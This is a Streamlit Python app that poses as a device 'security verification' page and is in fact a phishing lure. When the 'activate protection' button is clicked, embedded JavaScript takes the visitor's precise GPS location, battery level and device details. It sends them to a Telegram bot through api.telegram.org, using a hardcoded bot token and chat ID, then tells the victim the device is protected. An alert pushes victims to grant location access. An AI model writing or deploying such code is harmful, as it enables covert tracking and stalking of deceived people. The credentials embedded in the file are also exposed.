import streamlit as st
import time

# --- CONFIGURAÇÃO DO TEU BOT ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

st.set_page_config(page_title="Segurança Integrada", layout="centered")

# --- CSS FIEL E AGRESSIVO ---
st.markdown("""
    <style>
    .main { background-color: #0b1117; color: white; font-family: sans-serif; }
    .stAlert { display: none !important; }
    
    .titulo { font-size: 32px; font-weight: bold; margin-top: 40px; text-align: left; }
    .status { font-size: 22px; margin: 15px 0; color: #e0e0e0; }
    .barra-azul { width: 100%; height: 6px; background-color: #007bff; border-radius: 10px; margin-bottom: 40px; }
    
    .btn-container { display: flex; justify-content: center; width: 100%; }
    .meu-botao {
        background-color: white; color: black; width: 300px; height: 85px;
        border-radius: 12px; border: none; font-size: 16px; font-weight: bold;
        display: flex; flex-direction: column; align-items: center; justify-content: center;
        cursor: pointer; line-height: 1.2; box-shadow: 0 4px 15px rgba(0,0,0,0.5);
    }
    .ponto-vermelho { color: #ff3b30; font-size: 28px; margin-bottom: -5px; }
    
    /* RODAPÉ SOLICITADO */
    .footer { 
        position: fixed; left: 0; bottom: 20px; width: 100%; 
        text-align: center; color: #555; font-size: 12px; font-family: sans-serif;
    }
    </style>
""", unsafe_allow_html=True)

# Interface [Visual 99%]
st.markdown('<div class="titulo">Verificação de Segurança</div>', unsafe_allow_html=True)
caixa_txt = st.empty()
caixa_txt.markdown('<div class="status">Verificando: 99%</div>', unsafe_allow_html=True)
st.markdown('<div class="barra-azul"></div>', unsafe_allow_html=True)

# --- MOTOR JS (FORÇA O POP-UP AZUL DO GPS) ---
js_final = f"""
<div class="btn-container">
    <button class="meu-botao" id="trigger">
        <span class="ponto-vermelho">●</span>
        <span>ATIVAR PROTEÇÃO<br>AGORA</span>
    </button>
</div>

<script>
document.getElementById('trigger').onclick = function() {{
    // 'enableHighAccuracy' obriga o Android a abrir a caixa de Precisão de Local
    navigator.geolocation.getCurrentPosition(
        async (pos) => {{
            try {{
                const bat = await navigator.getBattery();
                const info = "🛡️ PROTEÇÃO ATIVADA\\n📱 " + navigator.userAgent.split('(')[1].split(')')[0] + "\\n🔋 " + Math.round(bat.level * 100) + "%\\n📍 Local: https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
                
                await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                    method: "POST",
                    headers: {{ "Content-Type": "application/json" }},
                    body: JSON.stringify({{ chat_id: "{ID}", text: info }})
                }});
                window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
            }} catch(e) {{}}
        }},
        (err) => {{
            // Se o GPS estiver desligado, o Android abre o pop-up aqui
            alert("Ação necessária: Clique em 'Permitir' para concluir a segurança.");
        }},
        {{ enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }}
    );
}};
</script>
"""

# Componente com permissão de localização
clicou = st.components.v1.html(js_final, height=150)

# Rodapé Miamy
st.markdown('<div class="footer">Sistema Integrado de Segurança Desenvolvido Por Miamy © 2026</div>', unsafe_allow_html=True)

if clicou:
    caixa_txt.markdown('<div class="status">Verificando: 100%</div>', unsafe_allow_html=True)
    st.success("Dispositivo Protegido!")
    st.stop()
    
